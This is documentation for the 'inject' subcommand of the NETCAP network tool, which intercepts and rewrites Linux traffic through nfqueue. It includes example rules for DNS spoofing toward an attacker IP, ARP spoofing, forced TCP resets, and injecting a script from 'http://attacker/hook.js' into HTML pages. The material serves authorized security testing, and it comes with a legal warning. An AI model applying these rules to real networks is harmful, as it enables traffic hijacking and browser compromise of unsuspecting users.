# NETCAP Inject Command

The `inject` subcommand provides inline packet manipulation capabilities using Linux netfilter queue (nfqueue). This allows for MITM-style packet interception, modification, and injection based on configurable rules.

## Warning

**This tool is designed for authorized security testing and research only.**

Unauthorized interception or modification of network traffic may violate local, state, and federal laws. By using this tool, you acknowledge that:
- You have proper authorization to test the target network
- You understand the legal implications of packet manipulation
- You accept full responsibility for your actions

## Requirements

- **Linux only**: nfqueue is a Linux-specific feature
- **Root privileges**: Required for nfqueue and raw socket operations
- **iptables**: Required for routing packets to nfqueue

## Usage

```bash
# Basic usage
sudo net inject -rules /path/to/rules.yml -iface eth0 -iptables

# With target filter
sudo net inject -rules /path/to/rules.yml -iface eth0 -iptables -target "-d 192.168.1.0/24"

# Validate rules without running
net inject -rules /path/to/rules.yml -validate

# List loaded rules
net inject -rules /path/to/rules.yml -list-rules

# Dry run (evaluate rules but don't modify packets)
sudo net inject -rules /path/to/rules.yml -iface eth0 -iptables -dry-run -verbose
```

## Flags

| Flag | Short | Description |
|------|-------|-------------|
| `-rules` | `-r` | Path to injection rules YAML file or directory (required) |
| `-queue` | `-q` | nfqueue number to use (default: 0) |
| `-iface` | `-i` | Network interface for packet injection |
| `-iptables` | | Automatically configure iptables rules |
| `-target` | `-t` | iptables target specification (e.g., "-d 192.168.1.0/24") |
| `-verbose` | `-v` | Enable verbose output |
| `-dry-run` | | Evaluate rules without modifying packets |
| `-log-actions` | | Log all actions to file (default: true) |
| `-log-file` | | Path to action log file (default: injection.log) |
| `-max-queue-len` | | Maximum packets to queue (default: 1024) |
| `-list-rules` | `-l` | List loaded rules and exit |
| `-validate` | | Validate rules and exit |
| `-no-warning` | | Suppress the warning banner |

## Rule Configuration

Injection rules are defined in YAML format. See `configs/injection-rules.yml` for examples.

### Rule Structure

```yaml
rules:
  - name: Rule Name
    description: Human-readable description
    type: TCP|UDP|DNS|ARP|HTTP|etc
    expression: |
      <expr-lang expression>
    action: accept|drop|modify_payload|inject_tcp_rst|inject_dns|inject_arp|delay
    action_config:
      # Action-specific configuration
    enabled: true
    priority: 100  # Higher = evaluated first
    stop_on_match: false  # Stop evaluating after this rule matches
```

### Available Actions

| Action | Description |
|--------|-------------|
| `accept` | Forward packet unchanged |
| `drop` | Silently drop the packet |
| `modify_payload` | Search/replace in payload |
| `inject_tcp_rst` | Send TCP RST to terminate connection |
| `inject_dns` | Spoof DNS response |
| `inject_arp` | Send spoofed ARP reply |
| `delay` | Delay packet forwarding |

### Action Configuration

#### modify_payload
```yaml
action_config:
  search: "original text"
  replace: "modified text"
```

#### inject_dns
```yaml
action_config:
  response_ip: "192.168.1.100"
  ttl: 300
```

#### inject_arp
```yaml
action_config:
  spoof_mac: "aa:bb:cc:dd:ee:ff"
  target_ip: "192.168.1.1"  # Optional
```

#### delay
```yaml
action_config:
  delay_ms: 100
```

## Expression Syntax

Rules use [expr-lang](https://github.com/expr-lang/expr) expressions with access to all audit record fields. Helper functions available:

- `MatchesPattern(str, regex)` - Regex matching
- `InSubnet(ip, cidr)` - Check if IP is in subnet
- `IsPrivateIP(ip)` - Check if IP is private
- `IsPublicIP(ip)` - Check if IP is public
- `Contains(haystack, needle)` - String/slice contains
- `ContainsAny(str, ...substrs)` - Check multiple substrings

### Example Expressions

```yaml
# DNS query for specific domain
type: DNS
expression: |
  len(Questions) > 0 && MatchesPattern(Questions[0].Name, "(?i)evil\\.com$")

# TCP to specific port range
type: TCP
expression: DstPort >= 1 && DstPort <= 1024

# HTTP response with specific content type
type: HTTP
expression: StatusCode == 200 && MatchesPattern(ContentType, "(?i)text/html")
```

## Example Rules

### DNS Spoofing
```yaml
- name: DNS Spoof Example
  description: Redirect example.com to attacker IP
  type: DNS
  expression: |
    len(Questions) > 0 && MatchesPattern(Questions[0].Name, "(?i)example\\.com$")
  action: inject_dns
  action_config:
    response_ip: "192.168.1.100"
    ttl: 300
  enabled: true
```

### Connection Blocking
```yaml
- name: Block Outbound HTTPS to Private Network
  description: Prevent HTTPS connections to internal network
  type: TCP
  expression: |
    DstPort == 443 && InSubnet(DstIP, "10.0.0.0/8")
  action: inject_tcp_rst
  enabled: true
```

### HTTP Content Injection
```yaml
- name: Inject JavaScript
  description: Inject script into HTML responses
  type: HTTP
  expression: |
    StatusCode == 200 && MatchesPattern(ContentType, "(?i)text/html")
  action: modify_payload
  action_config:
    search: "</body>"
    replace: "<script src='http://attacker/hook.js'></script></body>"
  enabled: true
```

## Manual iptables Configuration

If not using `-iptables`, configure manually:

```bash
# Route all packets through nfqueue 0
sudo iptables -A INPUT -j NFQUEUE --queue-num 0
sudo iptables -A OUTPUT -j NFQUEUE --queue-num 0
sudo iptables -A FORWARD -j NFQUEUE --queue-num 0

# Clean up after
sudo iptables -D INPUT -j NFQUEUE --queue-num 0
sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0
sudo iptables -D FORWARD -j NFQUEUE --queue-num 0
```

## Logging

When `-log-actions` is enabled (default), all injection actions are logged to the specified log file in JSON format:

```json
{"timestamp":"2024-01-15T10:30:45.123Z","rule":"DNS Spoof","action":"inject_dns","success":true,"details":{"response_ip":"192.168.1.100","ttl":300}}
```

## Performance Considerations

- Higher `-max-queue-len` values provide better throughput but use more memory
- Complex expressions may impact latency
- Consider using BPF filters upstream to reduce nfqueue load
- Use `-dry-run` for testing rule performance

